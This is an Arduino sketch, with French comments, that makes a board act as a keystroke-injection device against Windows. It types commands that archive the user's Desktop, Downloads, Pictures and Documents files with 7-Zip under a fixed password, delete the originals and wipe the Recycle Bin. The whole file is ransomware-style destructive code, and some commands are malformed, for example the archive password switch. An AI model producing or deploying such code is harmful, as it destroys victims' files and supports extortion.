#include <Keyboard.h>

void setup() {
  // Initialiser le Keyboard
  Keyboard.begin();
  delay(2000); // Attendre 2 secondes avant de commencer 
}

void loop() {
  // Rechercher des fichiers sur le Bureau, dans Téléchargements, Images et Documents
  searchAndEncryptFiles("Desktop");
  searchAndEncryptFiles("Downloads");
  searchAndEncryptFiles("Pictures");
  searchAndEncryptFiles("Documents");

  // Terminer le script
  while (true) {}
}

void searchAndEncryptFiles(String directory) {
  // Ouvrir le command prompt
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Changer de répertoire
  Keyboard.print("cd ");
  Keyboard.print(directory);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Lister les fichiers
  Keyboard.print("dir /b /a-d"); // Ne lister que les fichiers
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Vérifier si des fichiers ont été trouvés
  Keyboard.print("if not exist * (echo No files found in directory) else (echo Files found in directory)");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Créer une archive cryptée avec un mdp solide
  Keyboard.print("7z a UgWd8e5wX%N2&tq+29CpHd4Wg encrypted_files.7z *"); // Créer une archive cryptée en utilisant 7-Zip
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(10000); // Attendre que l'archive soit créée

  // Vérifier si l'archive a été créée avec succès
  Keyboard.print("if exist encrypted_files.7z (echo Archive created successfully) else (echo Archive creation failed)");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Supprimer les fichiers originaux
  Keyboard.print("del *");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Vérifier si les fichiers ont été supprimés
  Keyboard.print("if not exist * (echo Files deleted successfully) else (echo Files deletion failed)");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

  // Supprimer définitivement depuis la corbeille
  Keyboard.print("rd /s /q $Recycle.Bin");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
}
